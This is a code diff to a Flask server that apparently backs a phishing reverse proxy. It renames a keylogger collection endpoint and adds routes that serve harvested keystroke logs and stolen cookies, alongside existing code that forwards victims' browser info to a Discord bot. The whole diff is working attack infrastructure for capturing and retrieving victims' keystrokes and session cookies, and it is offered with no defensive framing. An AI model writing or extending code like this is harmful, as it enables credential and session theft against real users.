@@ -146,8 +146,8 @@ def start_proxy(target, host, port, secret):
             discord_bot.send_browser_info(data)
         return jsonify({'status': 'success'})
 
-    @app.route('/ep/api/keylogger', methods=['POST'])
-    def handle_keylogger():
+    @app.route('/ep/api/keylog', methods=['POST'])
+    def handle_keylog():
         data = request.json
         try:
             with open('keylogs.json', 'r+') as f:
@@ -174,6 +174,30 @@ def start_proxy(target, host, port, secret):
         except Exception as e:
             print(f"{Fore.RED}[!] Error saving keylog: {str(e)}{Fore.RESET}")
             return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    @app.route('/ep/api/getKeylog', methods=['GET'])
+    def get_keylog():
+        try:
+            with open('keylogs.json', 'r') as f:
+                return jsonify(json.load(f))
+        except:
+            return jsonify([])
+
+    @app.route('/ep/api/getCookies', methods=['GET'])
+    def get_cookies():
+        try:
+            with open('cookies.json', 'r') as f:
+                return jsonify(json.load(f))
+        except:
+            return jsonify([])
+
+    @app.route('/ep/api/serverInfo', methods=['GET'])
+    def get_server_info():
+        return jsonify({
+            'target': target,
+            'host': host,
+            'port': port
+        })
 
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
